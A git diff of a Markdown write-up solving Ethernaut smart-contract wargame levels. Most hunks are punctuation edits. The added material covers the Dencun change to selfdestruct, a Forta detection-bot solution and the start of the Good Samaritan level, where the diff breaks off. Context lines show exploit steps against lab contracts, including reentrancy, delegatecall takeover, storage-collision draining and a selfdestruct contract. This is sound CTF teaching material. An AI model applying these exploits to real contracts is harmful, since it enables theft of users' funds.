@@ -476,7 +476,7 @@ if (tx.origin != msg.sender) {
 
 Ironically, this condition **only allows the change** when the caller seems "indirect" which is backwards from what a secure contract would want.
 
-**`tx.origin`** The original human wallet that kicked off the entire transaction chain. Always an EOA (Externally Owned Account — a real wallet, never a contract). 
+**`tx.origin`** The original human wallet that kicked off the entire transaction chain. Always an EOA (Externally Owned Account - a real wallet, never a contract). 
 
 **`msg.sender`** The immediate caller of the current function. Could be a wallet *or* a contract.
 
@@ -487,11 +487,11 @@ Inside Contract B:
 - `tx.origin` = **You** (the wallet, start of the chain)
 - `msg.sender` = **Contract A** (whoever called B directly)
 
-When you call a contract directly with no middleman, both are just you — so they're equal.
+When you call a contract directly with no middleman, both are just you - so they're equal.
 
 **Why `tx.origin` is dangerous for auth** ?
 
-It can be spoofed indirectly. If you trick a user into calling your malicious contract, `tx.origin` is still their wallet — meaning you can impersonate their authority downstream without them realizing it.
+It can be spoofed indirectly. If you trick a user into calling your malicious contract, `tx.origin` is still their wallet - meaning you can impersonate their authority downstream without them realizing it.
 
 Deploy this contract in Remix:
 
@@ -573,7 +573,7 @@ contract Token {
 
 A basic token system. You start with 20 tokens. It tracks balances in a mapping and lets you transfer tokens to others. That's it.
 
-In Solidity 0.6, `uint256` is an **unsigned integer** — it can never be negative. It ranges from `0` to `2²⁵⁶-1`.
+In Solidity 0.6, `uint256` is an **unsigned integer** - it can never be negative. It ranges from `0` to `2²⁵⁶-1`.
 
 So what happens when you go below zero?
 
@@ -587,7 +587,7 @@ It **wraps around** to the maximum possible uint256 value. This is called an und
 require(balances[msg.sender] - _value >= 0);
 ```
 
-This looks like it's checking you have enough balance. But `uint256` can **never** be negative — so this condition is **always true**, no matter what.
+This looks like it's checking you have enough balance. But `uint256` can **never** be negative - so this condition is **always true**, no matter what.
 
 Even if you have 20 tokens and try to transfer 21:
 
@@ -616,7 +616,7 @@ than:
 require(balances[msg.sender] - _value >= 0);
 ```
 
-This checks if you actually have enough **before** subtracting — no underflow possible. This is how Solidity 0.8+ handles it automatically under the hood.
+This checks if you actually have enough **before** subtracting - no underflow possible. This is how Solidity 0.8+ handles it automatically under the hood.
 # 6 - Delegation
 
 The goal of this level is for you to claim ownership of the instance you are given.
@@ -663,8 +663,8 @@ contract Delegation {
 
 There are **two contracts**:
 
-- **Delegate** — has an `owner` variable and a `pwn()` function that sets owner to caller
-- **Delegation** — also has an `owner` variable, holds a reference to Delegate, and has a fallback that forwards any unknown calls to Delegate via `delegatecall`
+- **Delegate** - has an `owner` variable and a `pwn()` function that sets owner to caller
+- **Delegation** - also has an `owner` variable, holds a reference to Delegate, and has a fallback that forwards any unknown calls to Delegate via `delegatecall`
 
 In solidity:
 
@@ -690,7 +690,7 @@ When you call a function, Solidity encodes it as the first 4 bytes of the keccak
 keccak256("pwn()") → first 4 bytes = the method ID
 ```
 
-When Delegation's fallback fires, it passes `msg.data` straight to delegatecall — which Delegate reads as "call pwn()".
+When Delegation's fallback fires, it passes `msg.data` straight to delegatecall - which Delegate reads as "call pwn()".
 
 Solve from console:
 
@@ -730,11 +730,11 @@ contract Force { /*
                    */ }
 ```
 
-It's a completely empty contract. No `receive()`, no `fallback()`, no payable functions — nothing. Normally if you try to send ETH to it, it would just revert. There's no way to accept ETH... or is there?
+It's a completely empty contract. No `receive()`, no `fallback()`, no payable functions - nothing. Normally if you try to send ETH to it, it would just revert. There's no way to accept ETH... or is there?
 
 **`selfdestruct`**
 
-There's one way to force ETH into any contract regardless of its code — `selfdestruct`.
+There's one way to force ETH into any contract regardless of its code - `selfdestruct`.
 
 When a contract self destructs:
 
@@ -799,7 +799,7 @@ A vault that stores a password and a locked state. You call `unlock()` with the 
 
 **`private` doesn't mean secret on blockchain**
 
-The `password` variable is marked `private` — but that only means **other contracts** can't read it directly. It does **not** hide it from anyone reading the blockchain.
+The `password` variable is marked `private` - but that only means **other contracts** can't read it directly. It does **not** hide it from anyone reading the blockchain.
 
 Everything stored on-chain is **publicly readable**. `private` just prevents Solidity-level access, not blockchain-level access.
 
@@ -829,7 +829,7 @@ await contract.locked() // should return false
 
 A ponzi king-of-the-hill game. Whoever sends more ETH than the current prize becomes the new king. When dethroned, the old king gets paid. The owner can always reclaim kingship for free.
 
-When you submit the level, Ethernaut tries to reclaim kingship — you need to **prevent that from ever succeeding**.
+When you submit the level, Ethernaut tries to reclaim kingship - you need to **prevent that from ever succeeding**.
 
 ```c
 // SPDX-License-Identifier: MIT
@@ -866,9 +866,9 @@ payable(king).transfer(msg.value);
 king = msg.sender;
 ```
 
-Before crowning a new king, it **pays the old king first**. If that payment **fails**, the whole transaction reverts — meaning no new king can ever be set.
+Before crowning a new king, it **pays the old king first**. If that payment **fails**, the whole transaction reverts - meaning no new king can ever be set.
 
-So if we make a contract the king, and that contract has no `receive()` or `fallback()` — or one that **always reverts** — then nobody can ever pay it, nobody can ever become the new king, game is permanently broken.
+So if we make a contract the king, and that contract has no `receive()` or `fallback()` - or one that **always reverts** - then nobody can ever pay it, nobody can ever become the new king, game is permanently broken.
 
 ```c
 // SPDX-License-Identifier: MIT
@@ -983,7 +983,7 @@ Attack calls withdraw()
 → balance finally updated (too late)
 ```
 
-This is called **re-entrancy** — we re-enter the withdraw function recursively before it finishes.
+This is called **re-entrancy** - we re-enter the withdraw function recursively before it finishes.
 
 ```c
 // SPDX-License-Identifier: MIT
@@ -1078,9 +1078,9 @@ contract Elevator {
 }
 ```
 
-We need to reach to top. An elevator that tries to reach the top floor. It asks the calling `Building` contract "is this the last floor?" twice. If the first check says **no**, it sets the floor and asks again — setting `top` to whatever the second answer is.
+We need to reach to top. An elevator that tries to reach the top floor. It asks the calling `Building` contract "is this the last floor?" twice. If the first check says **no**, it sets the floor and asks again - setting `top` to whatever the second answer is.
 
-The Elevator blindly trusts whatever `isLastFloor()` returns. It calls it **twice** expecting consistent answers — but it has no way to enforce that.
+The Elevator blindly trusts whatever `isLastFloor()` returns. It calls it **twice** expecting consistent answers - but it has no way to enforce that.
 
 ```c
 if (!building.isLastFloor(_floor)) {  // expects false → enter the if
@@ -1184,7 +1184,7 @@ Solidity packs variables into 32-byte slots sequentially:
 
 ```c
 Slot 0 → locked (bool, 1 byte)
-Slot 1 → ID (uint256, 32 bytes — fills entire slot)
+Slot 1 → ID (uint256, 32 bytes - fills entire slot)
 Slot 2 → flattening (uint8) + denomination (uint8) + awkwardness (uint16) → packed into one slot
 Slot 3 → data[0] (bytes32)
 Slot 4 → data[1] (bytes32)
@@ -1270,7 +1270,7 @@ contract GatekeeperOne {
     }
 }
 ```
-### Gate 1 — `msg.sender != tx.origin`
+### Gate 1 - `msg.sender != tx.origin`
 
 We've seen this before (Telephone level). Just use an intermediary contract. When your wallet calls the attack contract, which calls `enter()`:
 
@@ -1278,11 +1278,11 @@ We've seen this before (Telephone level). Just use an intermediary contract. Whe
 - `msg.sender` = attack contract
 
 They differ → gate passes.
-### Gate 2 — `gasleft() % 8191 == 0`
+### Gate 2 - `gasleft() % 8191 == 0`
 
 At the **exact moment** this modifier runs, the remaining gas must be a perfect multiple of 8191.
 
-You can't predict gas consumption exactly — EVM opcodes vary. So you **brute-force** it: try every possible gas offset from `8191 * someMultiplier` to `8191 * someMultiplier + 8191` until one works.
+You can't predict gas consumption exactly - EVM opcodes vary. So you **brute-force** it: try every possible gas offset from `8191 * someMultiplier` to `8191 * someMultiplier + 8191` until one works.
 ### Gate 3 
 
 Three conditions on `bytes8 _gateKey`, when viewed as a `uint64`:
@@ -1302,13 +1302,13 @@ k = [B7][B6][B5][B4] [B3][B2][B1][B0]
          ↑uint32↑      ↑uint16↑
 ```
 
-**Condition 3** tells us what `uint16(k)` must equal — the last 2 bytes of your wallet address.
+**Condition 3** tells us what `uint16(k)` must equal - the last 2 bytes of your wallet address.
 
-**Condition 1** says `uint32(k) == uint16(k)` — meaning the upper 2 bytes of the lower 4 bytes must be `0x0000`.
+**Condition 1** says `uint32(k) == uint16(k)` - meaning the upper 2 bytes of the lower 4 bytes must be `0x0000`.
 
 So bytes 4–5 must be `0x0000`.
 
-**Condition 2** says `uint32(k) != uint64(k)` — meaning the upper 4 bytes can't all be zero. We can just keep your wallet's upper bytes there.
+**Condition 2** says `uint32(k) != uint64(k)` - meaning the upper 4 bytes can't all be zero. We can just keep your wallet's upper bytes there.
 
 Formula:
 
@@ -1402,10 +1402,10 @@ contract GatekeeperTwo {
     }
 }
 ```
-### Gate 1 — `msg.sender != tx.origin`
+### Gate 1 - `msg.sender != tx.origin`
 
 Identical to Gatekeeper One. Use an intermediary contract. 
-## Gate 2 — `extcodesize(caller()) == 0`
+## Gate 2 - `extcodesize(caller()) == 0`
 
 `extcodesize(address)` returns the number of bytes of code at an address.
 
@@ -1432,7 +1432,7 @@ Deploy AttackContract
 ```
 
 So we put the entire attack inside the **constructor**. No separate `attack()` function needed.
-## Gate 3 — XOR Inverse
+## Gate 3 - XOR Inverse
 
 The condition:
 
@@ -1554,7 +1554,7 @@ contract NaughtCoin is ERC20 {
 
 NaughtCoin gives you 1,000,000 ERC20 tokens but tries to prevent you from moving them for 10 years via a `lockTokens` modifier on the `transfer()` function. The goal is to drain your balance to 0 without waiting.
 
-ERC20 is a **token standard** on Ethereum — a set of rules that every fungible token must follow so wallets, exchanges, and protocols can interact with them uniformly. Think of it like a contract interface agreement.
+ERC20 is a **token standard** on Ethereum - a set of rules that every fungible token must follow so wallets, exchanges, and protocols can interact with them uniformly. Think of it like a contract interface agreement.
 
 The standard defines these core functions:
 
@@ -1568,7 +1568,7 @@ allowance(owner, spender)    → check how much a spender is approved for
 
 **There are two separate ways to move tokens in ERC20**, not one.
 
-Path 1 — Direct transfer:
+Path 1 - Direct transfer:
 
 ```bash
 You → call transfer(recipient, amount)
@@ -1576,16 +1576,16 @@ You → call transfer(recipient, amount)
 
 You move tokens yourself, directly.
 
-Path 2 — Delegated transfer (approve + transferFrom):
+Path 2 - Delegated transfer (approve + transferFrom):
 
 ```bash
 Step 1: You → call approve(spender, amount)
 Step 2: Spender → call transferFrom(you, recipient, amount)
 ```
 
-You authorize someone else (or yourself from another context) to pull tokens from your account. This is how DEXes, lending protocols, and staking contracts work — you approve them once, then they pull when needed.
+You authorize someone else (or yourself from another context) to pull tokens from your account. This is how DEXes, lending protocols, and staking contracts work - you approve them once, then they pull when needed.
 
-Consider using Uniswap. You can't "push" tokens into a smart contract and have it know what to do — the contract needs to pull them during a transaction. So the flow is:
+Consider using Uniswap. You can't "push" tokens into a smart contract and have it know what to do - the contract needs to pull them during a transaction. So the flow is:
 
 ```bash
 1. You approve(UniswapRouter, 1000 USDC)
@@ -1609,7 +1609,7 @@ function transfer(address _to, uint256 _value) public override lockTokens return
 }
 ```
 
-The `override` keyword replaces the parent's `transfer()` with this new version. But **only `transfer()` was overridden.** `transferFrom()`, `approve()`, and everything else is still the raw, unmodified OpenZeppelin implementation — no timelock, no restrictions.
+The `override` keyword replaces the parent's `transfer()` with this new version. But **only `transfer()` was overridden.** `transferFrom()`, `approve()`, and everything else is still the raw, unmodified OpenZeppelin implementation - no timelock, no restrictions.
 
 ```c
 modifier lockTokens() {
@@ -1654,13 +1654,13 @@ Step 3: Verify the allowance was set
 // should match your balance
 ```
 
-Step 4: Call `transferFrom` to move all tokens — bypassing the timelock
+Step 4: Call `transferFrom` to move all tokens - bypassing the timelock
 
 ```js
 await contract.transferFrom(player, contract.address, balance)
 ```
 
-You can send to any address — another wallet, the contract itself, a burn address. The destination doesn't matter for completing the level.
+You can send to any address - another wallet, the contract itself, a burn address. The destination doesn't matter for completing the level.
 
 Step 5: Verify your balance is zero
 
@@ -1728,7 +1728,7 @@ The `Preservation` contract:
 2. Has an `owner` variable and a `storedTime` variable
 3. Provides `setFirstTime()` and `setSecondTime()` functions that use `delegatecall` to invoke `setTime(uint256)` on the libraries
 
-The `LibraryContract` is simple — it just has a `storedTime` variable and a `setTime()` function that writes to it.
+The `LibraryContract` is simple - it just has a `storedTime` variable and a `setTime()` function that writes to it.
 
 Look at the storage layout of both contracts:
 
@@ -2209,7 +2209,7 @@ This level is about:
 
 1. **Storage layout**
 2. **Dynamic array storage math**
-3. **Underflow (Solidity 0.5 — no SafeMath on arrays)**
+3. **Underflow (Solidity 0.5 - no SafeMath on arrays)**
 
 The vulnerability is here:
 
@@ -2912,7 +2912,7 @@ require((from == token1 && to == token2) || (from == token2 && to == token1), "I
 
 **DexTwo (new):** That line is **completely gone.**
 
-This means DexTwo will swap **any** ERC20 token — including ones you deploy yourself. You can create a fake token, seed the DEX with it, and manipulate the price ratio to drain the real tokens.
+This means DexTwo will swap **any** ERC20 token - including ones you deploy yourself. You can create a fake token, seed the DEX with it, and manipulate the price ratio to drain the real tokens.
 
 The pricing formula is still:
 
@@ -2948,9 +2948,9 @@ contract FakeToken is ERC20 {
 // amount: 1
 ```
 
-![8](Images/8.png)
+![9](Images/9.png)
 
-**Step — approve DexTwo to spend your FAKE:**
+**Step - approve DexTwo to spend your FAKE:**
 
 - Function: `approve`
 - `spender`: your DexTwo instance address
@@ -3158,7 +3158,7 @@ multicall([
 ```
 
 So you send **0.001 ETH** but your `balances[you]` gets credited **0.002 ETH**. Now you can drain more than you put in.
-### Step 1 — Become owner of PuzzleWallet via storage collision
+### Step 1 - Become owner of PuzzleWallet via storage collision
 
 `proposeNewAdmin` writes to slot 0 (pendingAdmin in proxy = owner in wallet):
 
@@ -3173,29 +3173,29 @@ await web3.eth.sendTransaction({from:player, to:contract.address, data:iface})
 ```js
 await contract.owner() // should return your address
 ```
-## Step 2 — Whitelist yourself
+## Step 2 - Whitelist yourself
 
 ```js
 await contract.addToWhitelist(player)
 ```
-## Step 3 — Check contract balance
+## Step 3 - Check contract balance
 
 ```js
 await getBalance(contract.address)
 ```
 
 Note the value shown (probably `0.001`).
-## Step 4 — Encode deposit calldata
+## Step 4 - Encode deposit calldata
 
 ```js
 let depositData = web3.eth.abi.encodeFunctionCall({name:'deposit',type:'function',inputs:[]},[])
 ```
-## Step 5 — Encode nested multicall
+## Step 5 - Encode nested multicall
 
 ```js
 let nestedMulticall = web3.eth.abi.encodeFunctionCall({name:'multicall',type:'function',inputs:[{type:'bytes[]',name:'data'}]},[[depositData]])
 ```
-## Step 6 — Call multicall with both, sending 0.001 ETH
+## Step 6 - Call multicall with both, sending 0.001 ETH
 
 ```js
 await contract.multicall([depositData, nestedMulticall], {value: toWei('0.001')})
@@ -3216,7 +3216,7 @@ await contract.execute(player, toWei('0.002'), '0x')
 ```js
 await getBalance(contract.address) // should be "0"
 ```
-## Step 7 — Overwrite admin via setMaxBalance
+## Step 7 - Overwrite admin via setMaxBalance
 
 ```js
 await contract.setMaxBalance(player)
@@ -3341,7 +3341,7 @@ contract Engine is Initializable {
 }
 ```
 
-In UUPS (Universal Upgradeable Proxy Standard), the **upgrade logic lives in the implementation**, not the proxy. The proxy is very thin — it just delegates everything to the implementation address stored in a special EIP-1967 slot.
+In UUPS (Universal Upgradeable Proxy Standard), the **upgrade logic lives in the implementation**, not the proxy. The proxy is very thin - it just delegates everything to the implementation address stored in a special EIP-1967 slot.
 
 ```c
 User → Motorbike (proxy) → delegatecall → Engine (implementation)
@@ -3357,7 +3357,7 @@ slot = keccak256("eip1967.proxy.implementation") - 1
 
 This slot is extremely unlikely to collide with any normal variable.
 
-The `Engine` contract uses `initializer` modifier to prevent `initialize()` from being called twice — **but only in the proxy's storage context**.
+The `Engine` contract uses `initializer` modifier to prevent `initialize()` from being called twice , **but only in the proxy's storage context**.
 
 When Motorbike deployed, it called:
 
@@ -3365,7 +3365,7 @@ When Motorbike deployed, it called:
 _logic.delegatecall(abi.encodeWithSignature("initialize()"))
 ```
 
-This ran `initialize()` in the **proxy's storage**, setting `upgrader` and `horsePower` there. But the **Engine contract's own storage** was never initialized — `initialized = false` still in Engine directly.
+This ran `initialize()` in the **proxy's storage**, setting `upgrader` and `horsePower` there. But the **Engine contract's own storage** was never initialized , `initialized = false` still in Engine directly.
 
 So you can call `initialize()` **directly on the Engine contract**, bypassing the proxy entirely, and become the `upgrader`.
 
@@ -3375,7 +3375,7 @@ So you can call `initialize()` **directly on the Engine contract**, bypassing th
 3. Deploy a Killer contract with selfdestruct
 4. Call `upgradeToAndCall(killerAddress, selfdestructCalldata)`
 5. Engine selfdestructs → motorbike is bricked
-## Step 1 — Get Engine's direct address
+## Step 1 - Get Engine's direct address
 
 ```c
 let engineAddress = await web3.eth.getStorageAt(
@@ -3388,7 +3388,7 @@ let engineAddress = await web3.eth.getStorageAt(
 // Clean up the address (remove extra leading zeros)
 engineAddress = "0x" + engineAddress.slice(26)
 ```
-## Step 2 — Call initialize() directly on Engine
+## Step 2 - Call initialize() directly on Engine
 
 ```js
 let initData = web3.eth.abi.encodeFunctionCall({
@@ -3405,13 +3405,13 @@ await web3.eth.sendTransaction({
     data: initData
 })
 ```
-## Step 3 — Verify you are now upgrader
+## Step 3 - Verify you are now upgrader
 
 ```js
 let upgraderSlot = await web3.eth.getStorageAt(engineAddress, 0)
 console.log(upgraderSlot) // should contain your address
 ```
-## Step 4 — Deploy Killer contract in Remix
+## Step 4 - Deploy Killer contract in Remix
 
 ```c
 // SPDX-License-Identifier: MIT
@@ -3425,7 +3425,7 @@ contract Killer {
 ```
 
 Deploy this on Sepolia in Remix. Note the address.
-## Step 5 — Encode the kill() call
+## Step 5 - Encode the kill() call
 
 ```js
 let killData = web3.eth.abi.encodeFunctionCall({
@@ -3434,7 +3434,7 @@ let killData = web3.eth.abi.encodeFunctionCall({
     inputs: []
 }, [])
 ```
-## Step 6 — Encode upgradeToAndCall
+## Step 6 - Encode upgradeToAndCall
 
 ```js
 let upgradeData = web3.eth.abi.encodeFunctionCall({
@@ -3446,7 +3446,7 @@ let upgradeData = web3.eth.abi.encodeFunctionCall({
     ]
 }, ["0xYOUR_KILLER_ADDRESS", killData])
 ```
-## Step 7 — Send directly to Engine
+## Step 7 - Send directly to Engine
 
 ```js
 await web3.eth.sendTransaction({
@@ -3457,5 +3457,2007 @@ await web3.eth.sendTransaction({
 ```
 
 Engine `selfdestruct`s. The Motorbike proxy now points to a dead contract. It is permanently bricked.  Now fucking Submit.
+
+Above solution breaks after new update.
+## Why This Breaks After Dencun (EIP-6780)
+
+EIP-6780 changed `selfdestruct`:
+
+```
+Before Dencun:                    After Dencun:
+selfdestruct() anywhere     →     selfdestruct() ONLY works if called
+destroys contract code            in SAME TX as contract creation
+```
+
+So after Dencun, calling `selfdestruct` on the Engine (which was created earlier) does **nothing** to its code - it just sends ETH.
+# 26 - Double Entry Point
+
+This level features a `CryptoVault` with special functionality, the `sweepToken` function. This is a common function used to retrieve tokens stuck in a contract. The `CryptoVault` operates with an `underlying` token that can't be swept, as it is an important core logic component of the `CryptoVault`. Any other tokens can be swept.
+
+The underlying token is an instance of the DET token implemented in the `DoubleEntryPoint` contract definition and the `CryptoVault` holds 100 units of it. Additionally the `CryptoVault` also holds 100 of `LegacyToken LGT`.
+
+In this level you should figure out where the bug is in `CryptoVault` and protect it from being drained out of tokens.
+
+The contract features a `Forta` contract where any user can register its own `detection bot` contract. Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a `detection bot` and register it in the `Forta` contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.
+
+Things that might help:
+
+- How does a double entry point work for a token contract?
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/access/Ownable.sol";
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+
+interface DelegateERC20 {
+    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
+}
+
+interface IDetectionBot {
+    function handleTransaction(address user, bytes calldata msgData) external;
+}
+
+interface IForta {
+    function setDetectionBot(address detectionBotAddress) external;
+    function notify(address user, bytes calldata msgData) external;
+    function raiseAlert(address user) external;
+}
+
+contract Forta is IForta {
+    mapping(address => IDetectionBot) public usersDetectionBots;
+    mapping(address => uint256) public botRaisedAlerts;
+
+    function setDetectionBot(address detectionBotAddress) external override {
+        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
+    }
+
+    function notify(address user, bytes calldata msgData) external override {
+        if (address(usersDetectionBots[user]) == address(0)) return;
+        try usersDetectionBots[user].handleTransaction(user, msgData) {
+            return;
+        } catch {}
+    }
+
+    function raiseAlert(address user) external override {
+        if (address(usersDetectionBots[user]) != msg.sender) return;
+        botRaisedAlerts[msg.sender] += 1;
+    }
+}
+
+contract CryptoVault {
+    address public sweptTokensRecipient;
+    IERC20 public underlying;
+
+    constructor(address recipient) {
+        sweptTokensRecipient = recipient;
+    }
+
+    function setUnderlying(address latestToken) public {
+        require(address(underlying) == address(0), "Already set");
+        underlying = IERC20(latestToken);
+    }
+
+    /*
+    ...
+    */
+
+    function sweepToken(IERC20 token) public {
+        require(token != underlying, "Can't transfer underlying token");
+        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
+    }
+}
+
+contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
+    DelegateERC20 public delegate;
+
+    function mint(address to, uint256 amount) public onlyOwner {
+        _mint(to, amount);
+    }
+
+    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
+        delegate = newContract;
+    }
+
+    function transfer(address to, uint256 value) public override returns (bool) {
+        if (address(delegate) == address(0)) {
+            return super.transfer(to, value);
+        } else {
+            return delegate.delegateTransfer(to, value, msg.sender);
+        }
+    }
+}
+
+contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
+    address public cryptoVault;
+    address public player;
+    address public delegatedFrom;
+    Forta public forta;
+
+    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
+        delegatedFrom = legacyToken;
+        forta = Forta(fortaAddress);
+        player = playerAddress;
+        cryptoVault = vaultAddress;
+        _mint(cryptoVault, 100 ether);
+    }
+
+    modifier onlyDelegateFrom() {
+        require(msg.sender == delegatedFrom, "Not legacy contract");
+        _;
+    }
+
+    modifier fortaNotify() {
+        address detectionBot = address(forta.usersDetectionBots(player));
+
+        // Cache old number of bot alerts
+        uint256 previousValue = forta.botRaisedAlerts(detectionBot);
+
+        // Notify Forta
+        forta.notify(player, msg.data);
+
+        // Continue execution
+        _;
+
+        // Check if alarms have been raised
+        if (forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
+    }
+
+    function delegateTransfer(address to, uint256 value, address origSender)
+        public
+        override
+        onlyDelegateFrom
+        fortaNotify
+        returns (bool)
+    {
+        _transfer(origSender, to, value);
+        return true;
+    }
+}
+```
+
+The name says it all. The **DET token can be accessed via TWO entry points**:
+
+|Entry Point|How|
+|---|---|
+|Direct|Call `DET.transfer()` directly|
+|Indirect|Call `LGT.transfer()` → which calls `DET.delegateTransfer()`|
+
+DET stands for **DoubleEntryPoint Token**. It's an ERC20 token that has **two ways to move its balance** - hence "double entry point."
+### LegacyToken (LGT)
+
+This is the **old token** that was replaced by DET. Think of it like a deprecated v1 token
+
+```c
+contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
+    DelegateERC20 public delegate;  // Points to DET contract
+
+    function transfer(address to, uint256 value) public override returns (bool) {
+        if (address(delegate) == address(0)) {
+            return super.transfer(to, value);   // Normal transfer if no delegate
+        } else {
+            return delegate.delegateTransfer(to, value, msg.sender); // Forward to DET!
+        }
+    }
+}
+```
+### CryptoVault
+
+A simple vault that holds tokens and can sweep non-underlying tokens.
+
+```c
+contract CryptoVault {
+    address public sweptTokensRecipient;  // Where swept tokens go
+    IERC20 public underlying;             // = DET (the protected token)
+
+    function sweepToken(IERC20 token) public {
+        require(token != underlying, "Can't transfer underlying token");
+        // ^^^ PROTECTION: can't sweep DET directly
+
+        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
+        // ^^^ BUG: if token=LGT, this secretly drains DET!
+    }
+}
+```
+### Forta (On-Chain IDS)
+
+Forta is an **Intrusion Detection System** built into the contract.
+
+```c
+contract Forta is IForta {
+    mapping(address => IDetectionBot) public usersDetectionBots;
+    // user → their bot
+
+    mapping(address => uint256) public botRaisedAlerts;
+    // bot → how many alerts it raised
+
+    function setDetectionBot(address detectionBotAddress) external {
+        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
+        // Each user registers their own bot
+    }
+
+    function notify(address user, bytes calldata msgData) external {
+        // Called by DET during every delegateTransfer
+        // Forwards transaction data to user's bot for analysis
+        if (address(usersDetectionBots[user]) == address(0)) return;
+        try usersDetectionBots[user].handleTransaction(user, msgData) {
+            return;
+        } catch {}
+    }
+
+    function raiseAlert(address user) external {
+        // Bot calls this if it detects an attack
+        if (address(usersDetectionBots[user]) != msg.sender) return;
+        // ^^^ Only registered bot can raise alerts for its user
+        botRaisedAlerts[msg.sender] += 1;
+    }
+}
+```
+
+```c
+ADDRESSES (what the require check sees):
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+LGT  →  0xABCD...1234    ─┐
+                           ├── DIFFERENT addresses → check passes
+DET  →  0x9876...5678    ─┘
+
+
+BEHAVIOR (what actually happens):
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+LGT.transfer() ──────────────────────────► moves DET balance
+DET.transfer() ──────────────────────────► moves DET balance
+                                                ▲
+                                         SAME BALANCE!
+                                         TWO entry points
+```
+
+Both LGT and DET control the **exact same pool of tokens** inside DET's ERC20 storage. We can add rule in bot and deploy:
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IForta {
+    function raiseAlert(address user) external;
+}
+
+contract DetectionBot {
+
+    address private cryptoVault;
+    IForta  private forta;
+
+    constructor(address _cryptoVault, address _forta) {
+        cryptoVault = _cryptoVault;
+        forta = IForta(_forta);
+    }
+
+    function handleTransaction(address user, bytes calldata msgData) external {
+
+        // DECODE origSender from calldata
+        // ┌──────────────────────────────────────────┐
+        // │ bytes  0- 3 │ function selector (4 bytes) │
+        // │ bytes  4-35 │ `to`        (32 bytes)      │
+        // │ bytes 36-67 │ `value`     (32 bytes)      │
+        // │ bytes 68-99 │ `origSender`(32 bytes) ◄──  │
+        // └──────────────────────────────────────────┘
+
+        (, , address origSender) = abi.decode(
+            msgData[4:],                    // skip 4-byte selector
+            (address, uint256, address)     // decode 3 params
+        );
+
+        // THE ONE RULE:
+        // Vault should NEVER be the one initiating a token transfer
+        if (origSender == cryptoVault) {
+            forta.raiseAlert(user);   // veto this transaction
+        }
+    }
+}
+```
+
+Before deploying:
+
+```js
+// In browser console on Ethernaut
+
+// 1. Get addresses you need
+const fortaAddr = await contract.forta()
+const vaultAddr = await contract.cryptoVault()
+
+console.log("Forta:", fortaAddr)
+console.log("Vault:", vaultAddr)
+
+// 2. Deploy DetectionBot in Remix
+//    Constructor: (vaultAddr, fortaAddr)
+//    Copy deployed bot address → BOT_ADDRESS
+
+// 3. Register bot with Forta
+const fortaABI = ["function setDetectionBot(address) external"]
+
+const forta = new web3.eth.Contract(
+  [{"inputs":[{"name":"detectionBotAddress","type":"address"}],"name":"setDetectionBot","outputs":[],"stateMutability":"nonpayable","type":"function"}],
+  "0xc6fB2a97d2F1d50CF4beaf0082B8eC6E0A5f641c"
+)
+
+await forta.methods.setDetectionBot("PASTE_YOUR_BOT_ADDRESS").send({from: player})
+
+// 4. Confirm
+const botRegistered = await contract.forta()
+// Submit instance
+```
+# 27 - Good Samartian
+
+This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.
+
+Would you be able to drain all the balance from his Wallet?
+
+Things that might help:
+
+- [Solidity Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/)
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.0 <0.9.0;
+
+import "openzeppelin-contracts-08/utils/Address.sol";
+
+contract GoodSamaritan {
+    Wallet public wallet;
+    Coin public coin;
+
+    constructor() {
+        wallet = new Wallet();
+        coin = new Coin(address(wallet));
+
+        wallet.setCoin(coin);
+    }
+
+    function requestDonation() external returns (bool enoughBalance) {
+        // donate 10 coins to requester
+        try wallet.donate10(msg.sender) {
+            return true;
+        } catch (bytes memory err) {
+            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
+                // send the coins left
+                wallet.transferRemainder(msg.sender);
+                return false;
+            }
+        }
+    }
+}
+
+contract Coin {
+    using Address for address;
+
+    mapping(address => uint256) public balances;
+
+    error InsufficientBalance(uint256 current, uint256 required);
+
+    constructor(address wallet_) {
+        // one million coins for Good Samaritan initially
+        balances[wallet_] = 10 ** 6;
+    }
+
+    function transfer(address dest_, uint256 amount_) external {
+        uint256 currentBalance = balances[msg.sender];
+
+        // transfer only occurs if balance is enough
+        if (amount_ <= currentBalance) {
+            balances[msg.sender] -= amount_;
+            balances[dest_] += amount_;
+
+            if (dest_.isContract()) {
+                // notify contract
+                INotifyable(dest_).notify(amount_);
+            }
+        } else {
+            revert InsufficientBalance(currentBalance, amount_);
+        }
+    }
+}
+
+contract Wallet {
+    // The owner of the wallet instance
+    address public owner;
+
+    Coin public coin;
+
+    error OnlyOwner();
+    error NotEnoughBalance();
+
+    modifier onlyOwner() {
+        if (msg.sender != owner) {
+            revert OnlyOwner();
+        }
+        _;
+    }
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function donate10(address dest_) external onlyOwner {
+        // check balance left
+        if (coin.balances(address(this)) < 10) {
+            revert NotEnoughBalance();
+        } else {
+            // donate 10 coins
+            coin.transfer(dest_, 10);
+        }
+    }
+
+    function transferRemainder(address dest_) external onlyOwner {
+        // transfer balance left
+        coin.transfer(dest_, coin.balances(address(this)));
+    }
+
